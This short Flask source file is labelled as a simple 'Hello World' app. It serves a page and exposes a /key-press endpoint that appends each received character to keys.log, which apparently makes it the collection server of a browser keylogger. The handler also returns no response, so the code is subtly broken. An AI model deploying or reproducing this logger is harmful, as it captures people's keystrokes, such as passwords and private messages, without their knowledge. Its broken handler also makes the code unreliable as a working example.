# A very simple Flask Hello World app for you to get started with...
from flask import Flask, render_template, request

app = Flask(__name__)
@app.route('/')
def hello_world():
    return render_template("index.html")

@app.route("/key-press", methods=["POST"])
def key_press():
    character = request.json['key']
    if len(character) == 1:
        with open("keys.log", "a+") as file:
            file.write(character)
app.run(port=8080)